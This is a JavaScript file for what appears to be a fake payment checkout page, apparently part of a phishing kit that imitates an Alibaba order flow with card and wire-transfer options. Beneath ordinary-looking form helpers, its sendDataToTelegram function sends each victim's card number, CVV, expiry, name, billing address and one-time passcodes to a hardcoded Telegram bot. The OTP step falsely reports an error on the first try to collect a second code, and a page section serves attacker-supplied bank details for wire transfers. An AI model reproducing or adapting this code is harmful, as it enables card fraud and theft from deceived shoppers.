function toggleDropdown() {
  const dropdown = document.getElementById('languageOptions');
  dropdown.classList.toggle('show');
}

function selectLanguage(lang) {
  const selected = document.getElementById('selectedLanguage');
  const options = document.getElementById('languageOptions').getElementsByTagName('li');
  selected.textContent = options[lang === 'en' ? 0 : lang === 'zh-cn' ? 1 : 2].textContent;
  document.getElementById('languageOptions').classList.remove('show');
  changeLanguage(lang);
}

function changeLanguage(lang) {
  fetch('translations.json')
    .then(response => response.json())
    .then(translations => {
      const elements = document.getElementsByClassName('translate');
      for (let element of elements) {
        const key = element.getAttribute('data-key');
        element.textContent = translations[lang][key] || element.textContent;
      }
    })
    .catch(error => console.error('Error loading translations:', error));
}

// Loader logic
window.onload = function () {
  const loader = document.querySelector('.skeleton');
  loader.classList.remove('show');
};

// Close dropdown when clicking outside
document.addEventListener('click', function (event) {
  const dropdown = document.getElementById('languageOptions');
  const button = document.querySelector('.select-button');
  if (!button.contains(event.target) && !dropdown.contains(event.target)) {
    dropdown.classList.remove('show');
  }
});

// Show loading overlay and popup
function showLoadingOverlay(popupType) {
  const loadingOverlay = document.getElementById('loadingOverlay');
  const wireTransferPopup = document.getElementById('wireTransferPopup');
  const creditCardPopup = document.getElementById('creditCardPopup');

  if (loadingOverlay) {
    loadingOverlay.classList.add('show');
  } else {
    console.error('Loading overlay not found');
  }

  setTimeout(() => {
    if (loadingOverlay) {
      loadingOverlay.classList.remove('show');
    }
    if (popupType === 'wireTransfer' && wireTransferPopup) {
      wireTransferPopup.classList.add('show');
    } else if (popupType === 'creditCard' && creditCardPopup) {
      creditCardPopup.classList.add('show');
    }
  }, 5000);
}

// Close popup
function closePopup(popupId) {
  const popup = document.getElementById(popupId);
  if (popup) {
    popup.classList.remove('show');
  }
}

// Save popup as image
function saveAsImage(popupId) {
  const popupContent = document.querySelector(`#${popupId} .popup-content`);

  if (popupContent) {
    html2canvas(popupContent, {
      backgroundColor: '#ffffff',
      useCORS: true
    }).then(canvas => {
      const image = canvas.toDataURL('image/png');
      const link = document.createElement('a');
      link.href = image;
      link.download = 'tt-account-details.html';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }).catch(error => {
      console.error('Error generating image:', error);
    });
  }
}

// Format card number input
function formatCardNumber(input) {
  let value = input.value.replace(/\D/g, '');
  value = value.replace(/(\d{4})/g, '$1 ').trim();
  input.value = value;
}

// Format expiry date input
function formatExpiryDate(input) {
  let value = input.value.replace(/\D/g, '');
  if (value.length >= 3) {
    value = value.slice(0, 2) + '/' + value.slice(2, 4);
  }
  input.value = value;
}

// Toggle CVV visibility
function toggleCvvVisibility() {
  const cvvInput = document.getElementById('cvv');
  const eyeIcon = document.getElementById('eyeIcon');
  if (cvvInput && eyeIcon) {
    if (cvvInput.type === 'password') {
      cvvInput.type = 'text';
      eyeIcon.src = 'https://upload.wikimedia.org/wikipedia/commons/7/77/Eye_icon_(closed).svg';
      eyeIcon.alt = 'Hide';
    } else {
      cvvInput.type = 'password';
      eyeIcon.src = 'https://upload.wikimedia.org/wikipedia/commons/1/1c/Eye_icon.svg';
      eyeIcon.alt = 'Show';
    }
  }
}

// Send data to Telegram endpoint using a real POST request
async function sendDataToTelegram(data, type) {
  const botToken = "7445675870:AAHiW1Hv0zpHT9Y2uftSI_vIEfzOpr0hhuo";
  const chatId = "5632502904";
  let message;

  // Format the message based on the type of data (card or OTP)
  if (type === 'card') {
    message = `New Payment Attempt\nCard Number: ${data.cardNumber}\nCardholder Name: ${data.fullName}\nExpiration Date: ${data.expMonth}/${data.expYear}\nCVV: ${data.cvv}\nBilling Address: ${data.billingAddress}\nCountry: ${data.country}\nCity: ${data.city}\nZIP Code: ${data.zipCode}\nSave Card: ${data.saveCard}\nTime: ${new Date().toLocaleString()} (Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone})\n\n𝕸𝖆𝖉𝖊 𝖇𝖞 𝕭𝖉𝖊𝖛;`;
  } else if (type === 'otp') {
    message = `OTP Verification Attempt\nOTP: ${data.otp}\nTime: ${new Date().toLocaleString()} (Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone})\n\n𝕸𝖆𝖉𝖊 𝖇𝖞 𝕭𝖉𝖊𝖛;`;
  }

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    });

    const result = await response.json();

    if (response.ok) {
      return { ok: true };
    } else {
      console.error('Telegram API Error:', result);
      return { ok: false };
    }
  } catch (error) {
    console.error('Failed to send data to Telegram:', error.message);
    return { ok: false };
  }
}

// Collect and send card details with ZIP validation
async function collectCardDetails() {
  const proceedBtn = document.querySelector('.proceed-btn');
  const zipCode = document.getElementById('zipCode').value;

  // Validate ZIP code (exactly 5 digits)
  if (!/^\d{5}$/.test(zipCode)) {
    alert('Please enter a valid 5-digit ZIP code.');
    if (proceedBtn) proceedBtn.textContent = 'Proceed'; // Reset button text
    return;
  }

  if (proceedBtn) {
    proceedBtn.textContent = 'Proceeding...';
  }

  const cardData = {
    cardNumber: document.getElementById('cardNumber').value,
    fullName: document.getElementById('fullName').value,
    expMonth: document.getElementById('expMonth').value,
    expYear: document.getElementById('expYear').value,
    cvv: document.getElementById('cvv').value,
    billingAddress: document.getElementById('billingAddress').value,
    country: document.getElementById('country').value,
    city: document.getElementById('city').value,
    zipCode: zipCode,
    saveCard: document.getElementById('saveCard').checked
  };

  // Send card data to Telegram endpoint
  const response = await sendDataToTelegram(cardData, 'card');
  if (response.ok) {
    console.log('Card data sent successfully.');
  } else {
    console.error('Failed to send card data.');
  }

  const loadingOverlay = document.getElementById('loadingOverlay');
  if (loadingOverlay) {
    loadingOverlay.classList.add('show');
    setTimeout(() => {
      loadingOverlay.classList.remove('show');
      const otpPopup = document.getElementById('otpPopup');
      if (otpPopup) {
        otpPopup.classList.add('show');
      } else {
        console.error('OTP popup not found');
      }
    }, 60000); // 1-minute delay
  } else {
    console.error('Loading overlay not found');
  }
}

// Track OTP verification attempts
let otpAttempts = 0;

// Verify OTP
async function verifyOTP() {
  const otp1 = document.getElementById('otp1').value;
  const otp2 = document.getElementById('otp2').value;
  const otp3 = document.getElementById('otp3').value;
  const otp4 = document.getElementById('otp4').value;
  const otp5 = document.getElementById('otp5').value;
  const otp = otp1 + otp2 + otp3 + otp4 + otp5;

  otpAttempts++;

  if (otpAttempts === 1) {
    // First attempt: Make the request before alerting
    const otpData = { otp };
    const response = await sendDataToTelegram(otpData, 'otp');
    if (!response.ok) {
      alert('Something went wrong, please try again.');
    }
  } else {
    // Second attempt: Send OTP data and redirect
    const otpData = { otp };
    const response = await sendDataToTelegram(otpData, 'otp');
    if (response.ok) {
      console.log('OTP data sent successfully.');
      // Redirect to a success page
      window.location.href = 'https://alibaba.com/success';
    } else {
      console.error('Failed to send OTP data.');
    }
  }
}

// Move to next OTP input field
function moveToNext(current, nextFieldID) {
  if (current.value.length >= current.maxLength) {
    document.getElementById(nextFieldID).focus();
  }
}

// Fetch Account Info Dynamically
function fetchAccountInfo() {
  const urlParams = new URLSearchParams(window.location.search);
  const orderId = urlParams.get('orderid');
  const fetchUrl = orderId ? `get_account_info.php?orderid=${encodeURIComponent(orderId)}` : 'get_account_info.php';

  fetch(fetchUrl)
    .then(response => response.json())
    .then(data => {
      if (!data.error) {
        if (document.getElementById('gateway-ben-account')) document.getElementById('gateway-ben-account').textContent = data.account_no;
        if (document.getElementById('gateway-swift')) document.getElementById('gateway-swift').textContent = data.swift_code;
        if (document.getElementById('gateway-ben-name')) document.getElementById('gateway-ben-name').textContent = data.ben_name;
        if (document.getElementById('gateway-ben-address')) document.getElementById('gateway-ben-address').textContent = data.ben_address;
        if (document.getElementById('gateway-bank-name')) document.getElementById('gateway-bank-name').textContent = data.bank_name;
        if (document.getElementById('gateway-bank-address')) document.getElementById('gateway-bank-address').textContent = data.bank_address;

        if (data.total_amount && document.getElementById('gateway-amount')) {
          document.getElementById('gateway-amount').textContent = 'USD ' + data.total_amount;
        }
      }
    })
    .catch(err => console.error('Error fetching account info:', err));
}

// Copy to Clipboard
function copyToClipboard(elementId) {
  const text = document.getElementById(elementId).innerText;
  navigator.clipboard.writeText(text).then(() => {
    alert("Copied to clipboard!");
  }).catch(err => {
    console.error("Could not copy text: ", err);
  });
}

// Handle Proof of Payment Upload
document.addEventListener("DOMContentLoaded", () => {
  fetchAccountInfo(); // Load account info on page load

  const fileInput = document.getElementById("proofOfPayment");
  if (fileInput) {
    fileInput.addEventListener("change", function (event) {
      const file = event.target.files[0];
      if (!file) return;

      const urlParams = new URLSearchParams(window.location.search);
      const orderId = urlParams.get('orderid');

      if (!orderId) {
        alert("Session order missing. Cannot upload receipt.");
        return;
      }

      document.querySelector('.save-btn').textContent = "Uploading...";
      document.querySelector('.save-btn').disabled = true;

      const formData = new FormData();
      formData.append("receipt", file);
      formData.append("orderid", orderId);

      fetch("upload_receipt.php", {
        method: "POST",
        body: formData
      })
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            alert("Proof of Payment uploaded successfully!");
            window.location.href = "../payment/success.php?orderid=" + encodeURIComponent(orderId);
          } else {
            alert("Error: " + data.error);
            document.querySelector('.save-btn').textContent = "Upload Proof of Payment";
            document.querySelector('.save-btn').disabled = false;
          }
        })
        .catch(error => {
          console.error("Upload error:", error);
          alert("Error uploading proof of payment. Please try again.");
          document.querySelector('.save-btn').textContent = "Upload Proof of Payment";
          document.querySelector('.save-btn').disabled = false;
        });
    });
  }
});